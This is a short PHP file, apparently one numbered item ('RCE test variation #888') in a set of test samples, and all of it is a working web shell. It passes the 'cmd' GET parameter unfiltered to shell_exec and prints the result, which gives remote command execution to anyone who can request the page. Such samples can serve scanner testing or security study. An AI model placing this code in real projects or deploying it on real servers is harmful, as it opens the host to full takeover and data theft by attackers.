<?php
// RCE test variation #888
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>